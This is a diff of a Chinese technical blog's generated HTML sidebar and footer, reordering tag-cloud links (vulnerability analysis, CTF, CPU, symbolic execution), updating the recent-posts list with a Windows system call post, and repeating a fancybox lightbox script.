-			<li><a href="/tags/CPU/">CPU<span>3</span></a></li>
-		
-			<li><a href="/tags/漏洞分析/">漏洞分析<span>6</span></a></li>
-		
-			<li><a href="/tags/算法与数据结构/">算法与数据结构<span>3</span></a></li>
-		
-			<li><a href="/tags/Android/">Android<span>1</span></a></li>
 		
 			<li><a href="/tags/python/">python<span>2</span></a></li>
 		
 			<li><a href="/tags/CTF/">CTF<span>1</span></a></li>
+		
+			<li><a href="/tags/软件调试/">软件调试<span>1</span></a></li>
+		
+			<li><a href="/tags/CTF-Writeup/">CTF,Writeup<span>2</span></a></li>
+		
+			<li><a href="/tags/Android/">Android<span>1</span></a></li>
+		
+			<li><a href="/tags/CPU/">CPU<span>3</span></a></li>
+		
+			<li><a href="/tags/算法与数据结构/">算法与数据结构<span>3</span></a></li>
+		
+			<li><a href="/tags/unix/">unix<span>2</span></a></li>
+		
+			<li><a href="/tags/漏洞分析/">漏洞分析<span>6</span></a></li>
+		
+			<li><a href="/tags/符号执行/">符号执行<span>1</span></a></li>
 		
 		 
 		</ul>
@@ -2562,6 +2506,10 @@
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2021/09/24/Windows系统调用/" ><i class="fa fa-file-o"></i>Windows系统调用</a>
+      </li>
     
       <li>
         <a href="/2021/09/17/Windbg用法/" ><i class="fa fa-file-o"></i>Windbg用法</a>
@@ -2577,10 +2525,6 @@
     
       <li>
         <a href="/2021/09/02/高级IO/" ><i class="fa fa-file-o"></i>高级I/O</a>
-      </li>
-    
-      <li>
-        <a href="/2021/08/30/守护进程/" ><i class="fa fa-file-o"></i>Unix守护进程</a>
       </li>
     
   </ul>
@@ -2634,6 +2578,16 @@
 <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
 <script src="/fancybox/jquery.fancybox.pack.js"></script>
 <script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
+t/javascript">
 (function($){
   $('.fancybox').fancybox();
 })(jQuery);
